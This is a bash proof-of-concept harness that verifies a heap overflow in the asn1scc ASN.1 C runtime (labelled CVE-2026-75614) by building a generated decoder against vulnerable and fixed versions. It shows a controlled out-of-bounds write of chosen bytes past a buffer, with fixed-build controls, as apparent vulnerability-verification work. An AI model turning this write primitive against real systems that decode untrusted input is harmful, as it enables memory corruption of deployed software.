#!/usr/bin/env bash
# Real-upstream asn1scc CVE-2026-75614 harness.
# Unpacks the pinned 4.6.0.17 / 4.7.0.1 source tarballs and the pinned 4.7.0.1
# compiler asset, generates a minimal uPER decoder with that compiler, then
# compiles the same generated decoder against each pinned C runtime verbatim.
# No library source is edited. Local process only: no socket, listener or
# external host; the guard mode uses an anonymous private mmap page.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

# Pin check before any build; a drifted pin must stop the run.
cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2

rm -rf "$OUT/build"
mkdir -p "$OUT/build/v46" "$OUT/build/v47" "$OUT/build/gen"
tar -xjf "$HERE/src/asn1scc-bin-4.7.0.1.tar.bz2" -C "$OUT/build" || exit 2
tar -xzf "$HERE/src/asn1scc-4.6.0.17.tar.gz" -C "$OUT/build/v46" --strip-components=1 || exit 2
tar -xzf "$HERE/src/asn1scc-4.7.0.1.tar.gz" -C "$OUT/build/v47" --strip-components=1 || exit 2
cp "$HERE/schema.asn" "$OUT/build/gen/" || exit 2
(cd "$OUT/build/gen" && ../asn1scc/asn1scc -c -uPER schema.asn) > "$OUT/codegen.log" 2>&1 || exit 2

# Both builds use the same generated schema.c; only the pinned runtime differs.
INC46="-I$OUT/build/v46/asn1crt -I$OUT/build/gen"
INC47="-I$OUT/build/v47/asn1crt -I$OUT/build/gen"
gcc -g -O0 -Wall -fsanitize=address -fno-omit-frame-pointer $INC46 \
  "$HERE/driver.c" "$OUT/build/gen/schema.c" "$OUT/build/v46/asn1crt/"*.c \
  -o "$OUT/v46_asan" || exit 2
gcc -g -O0 -Wall -fsanitize=address -fno-omit-frame-pointer $INC47 \
  "$HERE/driver.c" "$OUT/build/gen/schema.c" "$OUT/build/v47/asn1crt/"*.c \
  -o "$OUT/v47_asan" || exit 2
gcc -g -O0 -Wall $INC46 "$HERE/driver.c" "$OUT/build/gen/schema.c" \
  "$OUT/build/v46/asn1crt/"*.c -o "$OUT/v46_plain" || exit 2

export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
pass=0; fail=0
check() {
  if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
  else echo "FAIL $1"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }

gen_c=$(sha256sum "$OUT/build/gen/schema.c" | cut -d' ' -f1)
gen_h=$(sha256sum "$OUT/build/gen/schema.h" | cut -d' ' -f1)
check "pinned compiler regenerates byte-identical schema.c/schema.h" \
  "$([ "$gen_c" = 0af4d8696ca11e2114cc80e1efcd5f0be79c97f3a0fc9bb490936fe7ce13bff1 ] && [ "$gen_h" = 0ccd6f32aca81c6a6ec20ab1eee99d5a85f39440c189cea8fa4b504d8b7ae69e ] && echo 1 || echo 0)"

# Rung 1: the runtime itself decodes the over-range 3-bit field as 7, though
# the schema declares SIZE(0..5).
rv=$($OUT/v46_plain rtcheck 7 0); echo "$rv"
check "rung1 pinned 4.6.0.1 runtime accepts size field 7 for range 0..5" \
  "$(contains 'rt=1 decoded=7' "$rv" && echo 1 || echo 0)"

# Rung 2: generated wrapper returns failure only after the copy has happened;
# the decoded field in the destination is already 7.
hb=$($OUT/v46_plain asan 7 0 2>/dev/null); echo "$hb"
check "rung2 generated decoder reports decoded=7 after the late constraint check" \
  "$(contains 'ok=0 err=1 decoded=7' "$hb" && echo 1 || echo 0)"

# Rung 3: ASan names the real pinned runtime store and generated call chain.
$OUT/v46_asan asan 7 0 > "$OUT/asan-hostile.log" 2>&1
ah=$(cat "$OUT/asan-hostile.log")
ok=0
contains 'heap-buffer-overflow' "$ah" &&
contains 'WRITE of size 1' "$ah" &&
contains 'asn1crt_encoding.c:400' "$ah" &&
contains 'asn1crt_encoding.c:1449' "$ah" &&
contains 'schema.c:59' "$ah" &&
contains '0 bytes after 9-byte region' "$ah" && ok=1
check "rung3 ASan WRITE from pinned asn1crt_encoding.c:400 via generated Payload_Decode" "$ok"

# Rung 4: chosen bytes land byte-exact at arr+5 / arr+6 in a staged region.
rb=$($OUT/v46_plain readback 7 0 2>/dev/null); echo "$rb"
check "rung4 chosen 0x5a/0xa5 pattern 0 at +5/+6, array bytes exact" \
  "$(contains 'arr=5aa55aa55a past +5=a5 +6=5a expected=5aa55aa55aa55a' "$rb" && echo 1 || echo 0)"
rb2=$($OUT/v46_plain readback 7 1 2>/dev/null); echo "$rb2"
check "second chosen pattern 0xa5/0x5a, not a fixed marker" \
  "$(contains 'arr=a55aa55aa5 past +5=5a +6=a5 expected=a55aa55aa55aa5' "$rb2" && echo 1 || echo 0)"

# First past-end store faults when arr[5] sits at a PROT_NONE page boundary.
( $OUT/v46_plain guard 7 0 > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page faults on the first out-of-bounds store (rc 139)" \
  "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

# Negative controls: the released fixed runtime rejects the field before any
# write; benign packets are clean on both builds.
rf=$($OUT/v47_asan rtcheck 7 0 2>&1); echo "$rf"
check "fixed 4.7.0.1 runtime rejects size 7 before the store" \
  "$(contains 'rt=0 decoded=0' "$rf" && ! contains 'AddressSanitizer' "$rf" && echo 1 || echo 0)"
fh=$($OUT/v47_asan asan 7 0 2>&1); echo "$fh"
check "fixed 4.7.0.1 hostile packet writes 0 bytes (ASan clean)" \
  "$(contains 'decoded=0' "$fh" && ! contains 'AddressSanitizer' "$fh" && echo 1 || echo 0)"
bv=$($OUT/v46_asan asan 2 0 2>&1); echo "$bv"
check "vulnerable build accepts a size that fits, ASan clean" \
  "$(contains 'ok=1 err=0 decoded=2' "$bv" && ! contains 'AddressSanitizer' "$bv" && echo 1 || echo 0)"
fb=$($OUT/v47_asan asan 2 0 2>&1); echo "$fb"
check "fixed build accepts a size that fits, ASan clean" \
  "$(contains 'ok=1 err=0 decoded=2' "$fb" && ! contains 'AddressSanitizer' "$fb" && echo 1 || echo 0)"

# Determinism: two independent five-run groups; every line is normalized
# (fields, values, verdicts only — no PID, address or path text).
group() {
  for i in 1 2 3 4 5; do
    $OUT/v46_plain readback 7 0 2>/dev/null
    $OUT/v46_plain readback 7 1 2>/dev/null
    $OUT/v46_plain rtcheck 7 0 2>/dev/null
    $OUT/v47_asan rtcheck 7 0 2>/dev/null
    $OUT/v46_plain asan 2 0 2>/dev/null
  done
}
h1=$(group | sha256sum | cut -d' ' -f1)
h2=$(group | sha256sum | cut -d' ' -f1)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism: two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
